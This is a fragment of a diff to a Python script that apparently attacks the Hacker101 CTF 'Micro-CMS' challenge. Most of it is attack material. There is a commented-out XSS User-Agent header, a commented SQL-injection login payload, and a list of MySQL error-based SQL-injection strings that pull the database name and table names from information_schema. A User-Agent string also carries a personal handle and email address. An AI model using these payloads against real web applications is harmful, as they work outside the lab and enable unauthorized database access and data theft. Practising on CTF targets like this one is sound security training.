@@ -34,9 +34,9 @@ scraped = []
 
 # develop a payload generation 
 
-headers = {'User-Agent': 'NateAndreano im developer ;) ! ZeroSkilz@Hacker0ne-CTF-Player-Hackathon GitHUB ZeroSkilz how am i doing? email Snydooby@gmail.com '}
+headers = {'User-Agent': ' im developer ;) ! ZeroSkilz@Hacker0ne-CTF-Player-Hackathon GitHUB ZeroSkilz how am i doing? email Snydooby@gmail.com '}
 #headers = {'User-Agent': '<script>alert("XSS$$$$$$$######</script>'}
-#payload = {'username':"usr ' ", 'password':"'23"}
+#payload = {'username':"admin ' ", 'password':"'HACKER101"}
 
 micro_cms1 = [ "' OR (SELECT 1 from (select count(*), (concat('~',(select database()),'~',floor(rand(0)*2)))c from information_schema.tables group by c)a) AND '1' = '1", 
         "' OR (select 1 from (select count(*),concat((select(select concat(cast(table_name as char),0x7e)) from information_schema.tables where table_schema=database() limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) AND '1' = '1",
